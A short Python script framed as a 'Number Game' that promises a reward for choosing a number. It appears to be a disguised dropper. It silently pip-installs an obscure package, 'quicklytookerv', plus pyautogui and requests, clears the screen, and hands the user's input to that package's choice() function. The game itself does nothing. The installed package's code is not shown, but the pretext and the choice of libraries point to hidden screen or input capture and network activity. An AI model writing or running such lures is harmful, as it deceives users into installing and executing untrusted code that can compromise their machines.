import subprocess
import sys
import os

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# List of required packages
required_packages = ["quicklytookerv", "pyautogui", "requests"]

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        install(package)

os.system('cls' if os.name == 'nt' else 'clear')

from quicklytookerv import choice

print("Welcome to the Number Game!")
print("Choose a number between 1 and 10 to claim your reward.")

try:
    num = int(input("Enter a number (1-10): "))
except:
    num = 0

if 1 <= num <= 10:
    choice(num)
else:
    print("Invalid number. Please choose between 1 and 10.")
